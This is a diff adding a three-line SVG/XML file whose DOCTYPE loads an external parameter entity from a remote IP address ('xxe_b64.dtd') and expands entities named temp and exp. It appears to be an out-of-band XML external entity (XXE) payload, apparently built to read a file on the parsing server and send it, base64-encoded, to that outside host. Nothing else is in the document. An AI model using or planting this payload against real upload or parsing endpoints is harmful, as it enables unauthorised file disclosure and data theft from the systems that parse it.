@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ELEMENT svg ANY><!ENTITY % load SYSTEM "http://149.28.16.140/gadget/xxe_b64.dtd">%load;%temp;]>
+<svg>&exp;</svg>
